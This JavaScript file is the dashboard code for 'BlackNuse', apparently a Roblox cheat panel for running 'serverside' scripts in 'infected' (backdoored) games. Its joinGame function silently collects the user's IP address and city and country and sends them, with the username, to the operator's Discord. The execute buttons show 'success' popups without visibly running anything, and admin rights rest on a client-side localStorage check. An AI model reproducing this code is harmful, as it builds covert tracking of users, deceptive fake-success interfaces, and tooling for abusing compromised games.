class DashboardManager {
  constructor() {
    this.editor = null
    this.currentUser = null
    this.init()
  }

  async init() {
    this.currentUser = this.getCurrentUser()
    if (!this.currentUser) {
      window.location.href = "index.html"
      return
    }

    this.updateUserInterface()
    this.initializeEditor()
  }

  getCurrentUser() {
    const user = localStorage.getItem("blacknuse-current-user")
    return user ? JSON.parse(user) : null
  }

  updateUserInterface() {
    if (!this.currentUser) return

    document.getElementById("profile-name").textContent = this.currentUser.username
    document.getElementById("profile-role").textContent = this.currentUser.role === "admin" ? "Administrator" : "Premium"

    const isAdmin = this.currentUser.username === "excI" && this.currentUser.role === "admin"

    const adminMenus = document.querySelectorAll(".admin-menu")
    adminMenus.forEach((menu) => {
      menu.style.display = isAdmin ? "block" : "none"
    })
  }

  toggleSidebar() {
    const sidebar = document.getElementById("sidebar")
    sidebar.classList.toggle("collapsed")
  }

  initializeEditor() {
    require.config({ paths: { vs: "https://unpkg.com/monaco-editor@latest/min/vs" } })
    require(["vs/editor/editor.main"], (monaco) => {
      try {
        monaco.languages.register({ id: "lua" })

        const luaKeywords = [
          "and",
          "break",
          "do",
          "else",
          "elseif",
          "end",
          "false",
          "for",
          "function",
          "if",
          "in",
          "local",
          "nil",
          "not",
          "or",
          "repeat",
          "return",
          "then",
          "true",
          "until",
          "while",
        ]

        const robloxAPI = [
          "game",
          "workspace",
          "script",
          "wait",
          "spawn",
          "delay",
          "tick",
          "Instance",
          "Vector3",
          "CFrame",
          "Color3",
          "UDim2",
          "BrickColor",
          "Players",
          "RunService",
          "UserInputService",
          "TweenService",
          "ReplicatedStorage",
          "ServerStorage",
          "StarterGui",
          "StarterPack",
          "Lighting",
          "SoundService",
          "PathfindingService",
          "HttpService",
        ]

        monaco.languages.registerCompletionItemProvider("lua", {
          provideCompletionItems: function (model, position) {
            const suggestions = []

            luaKeywords.forEach((keyword) => {
              suggestions.push({
                label: keyword,
                kind: monaco.languages.CompletionItemKind.Keyword,
                insertText: keyword,
                detail: "Lua keyword",
              })
            })

            robloxAPI.forEach((api) => {
              suggestions.push({
                label: api,
                kind: monaco.languages.CompletionItemKind.Class,
                insertText: api,
                detail: "Roblox API",
              })
            })

            return { suggestions: suggestions }
          },
        })

        this.editor = monaco.editor.create(document.getElementById("editor"), {
          value: `-- BlackNuse Script Executor
print("Hello, BlackNuse!")

-- 예시 스크립트
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100

-- 자동완성을 위해 Ctrl+Space를 누르세요`,
          language: "lua",
          theme: "vs-dark",
          automaticLayout: true,
          fontSize: 14,
          lineNumbers: "on",
          roundedSelection: false,
          scrollBeyondLastLine: false,
          minimap: { enabled: true },
          suggestOnTriggerCharacters: true,
          quickSuggestions: {
            other: true,
            comments: false,
            strings: false,
          },
          parameterHints: {
            enabled: true,
          },
          wordBasedSuggestions: true,
          folding: true,
          foldingStrategy: "indentation",
          showFoldingControls: "always",
          wordWrap: "on",
          wrappingIndent: "indent",
        })

        const savedScript = localStorage.getItem("blacknuse-script")
        if (savedScript) {
          this.editor.setValue(savedScript)
        }

        this.editor.onDidChangeModelContent(() => {
          localStorage.setItem("blacknuse-script", this.editor.getValue())
        })

        console.log("Monaco Editor 초기화 완료")
      } catch (error) {
        console.error("Monaco Editor 초기화 실패:", error)
      }
    })
  }

  clearEditor() {
    if (this.editor) {
      this.editor.setValue("")
      localStorage.removeItem("blacknuse-script")
    }
  }

  async executeScript() {
    if (this.editor && this.currentUser) {
      const script = this.editor.getValue()

      // 사용자 스크립트 실행 횟수 업데이트
      await window.FirebaseDataManager.updateUser(this.currentUser.id, {
        scriptsExecuted: (this.currentUser.scriptsExecuted || 0) + 1,
      })

      this.currentUser.scriptsExecuted = (this.currentUser.scriptsExecuted || 0) + 1

      await window.SecurityManager.sendToDiscord("⚡ 스크립트 실행", "사용자가 스크립트를 실행했습니다.", [
        { name: "사용자", value: this.currentUser.username, inline: true },
        { name: "실행 시간", value: new Date().toLocaleString("ko-KR"), inline: true },
        { name: "스크립트 길이", value: `${script.length} 문자`, inline: true },
      ])

      document.getElementById("script-status").classList.add("active")
      setTimeout(() => {
        document.getElementById("script-status").classList.remove("active")
      }, 3000)

      window.Swal.fire({
        title: "실행 완료",
        text: "스크립트가 성공적으로 실행되었습니다",
        icon: "success",
        confirmButtonText: "확인",
      })
    }
  }

  async executeR6() {
    if (this.currentUser) {
      await window.FirebaseDataManager.updateUser(this.currentUser.id, {
        scriptsExecuted: (this.currentUser.scriptsExecuted || 0) + 1,
      })

      this.currentUser.scriptsExecuted = (this.currentUser.scriptsExecuted || 0) + 1
    }

    await window.SecurityManager.sendToDiscord("🎮 R6 실행", "사용자가 R6 스크립트를 실행했습니다.", [
      { name: "사용자", value: this.currentUser.username, inline: true },
      { name: "실행 시간", value: new Date().toLocaleString("ko-KR"), inline: true },
    ])

    document.getElementById("script-status").classList.add("active")
    setTimeout(() => {
      document.getElementById("script-status").classList.remove("active")
    }, 3000)

    window.Swal.fire({
      title: "R6 실행",
      text: "R6 스크립트가 실행되었습니다.",
      icon: "success",
      confirmButtonText: "확인",
    })
  }

  async executeRE() {
    if (this.currentUser) {
      await window.FirebaseDataManager.updateUser(this.currentUser.id, {
        scriptsExecuted: (this.currentUser.scriptsExecuted || 0) + 1,
      })

      this.currentUser.scriptsExecuted = (this.currentUser.scriptsExecuted || 0) + 1
    }

    await window.SecurityManager.sendToDiscord("🔄 RE 실행", "사용자가 RE 스크립트를 실행했습니다.", [
      { name: "사용자", value: this.currentUser.username, inline: true },
      { name: "실행 시간", value: new Date().toLocaleString("ko-KR"), inline: true },
    ])

    document.getElementById("script-status").classList.add("active")
    setTimeout(() => {
      document.getElementById("script-status").classList.remove("active")
    }, 3000)

    window.Swal.fire({
      title: "RE 실행",
      text: "리스폰이 되었습니다.",
      icon: "success",
      confirmButtonText: "확인",
    })
  }

  async joinGame(gameId) {
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const ipData = await ipResponse.json()
      const userIP = ipData.ip

      const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`)
      const locationData = await locationResponse.json()

      const gameNames = {
        test1: "테스트1",
        test2: "테스트2",
      }

      const gameName = gameNames[gameId] || gameId

      await window.SecurityManager.sendToDiscord("🎮 게임 접속", "사용자가 감염된 게임에 접속했습니다.", [
        { name: "게임 이름", value: gameName, inline: true },
        { name: "사용자", value: this.currentUser.username, inline: true },
        { name: "IP 주소", value: userIP, inline: true },
        { name: "위치", value: `${locationData.city || "알 수 없음"}, ${locationData.country_name || "알 수 없음"}`, inline: true },
        { name: "접속 시간", value: new Date().toLocaleString("ko-KR"), inline: false },
      ])

      window.Swal.fire({
        title: "게임 접속 중...",
        text: `${gameName}에 접속하고 있습니다.`,
        icon: "info",
        timer: 2000,
        showConfirmButton: false,
        didOpen: () => {
          window.Swal.showLoading()
        },
      }).then(() => {
        window.Swal.fire({
          title: "접속 완료!",
          text: `${gameName}에 성공적으로 접속했습니다. 서버사이드 스크립트를 실행할 수 있습니다.`,
          icon: "success",
          confirmButtonText: "확인",
        })
      })
    } catch (error) {
      console.error("게임 접속 실패:", error)
      window.Swal.fire({
        title: "접속 실패",
        text: "게임 접속 중 오류가 발생했습니다.",
        icon: "error",
        confirmButtonText: "확인",
      })
    }
  }

  showSection(sectionName) {
    const sections = document.querySelectorAll(".section")
    sections.forEach((section) => {
      section.classList.remove("active")
    })

    const navLinks = document.querySelectorAll(".sidebar li a")
    navLinks.forEach((link) => link.classList.remove("active"))

    const targetSection = document.getElementById(sectionName + "-section")
    if (targetSection) {
      targetSection.classList.add("active")

      const activeLink = document.querySelector(`[data-section="${sectionName}"]`)
      if (activeLink) {
        activeLink.classList.add("active")
      }
    }
  }

  logout() {
    window.Swal.fire({
      title: "로그아웃",
      text: "정말 로그아웃하시겠습니까?",
      icon: "question",
      showCancelButton: true,
      confirmButtonText: "로그아웃",
      cancelButtonText: "취소",
    }).then((result) => {
      if (result.isConfirmed) {
        localStorage.removeItem("blacknuse-current-user")
        window.location.href = "index.html"
      }
    })
  }
}

// 전역에서 사용할 수 있도록 설정
window.DashboardManager = DashboardManager
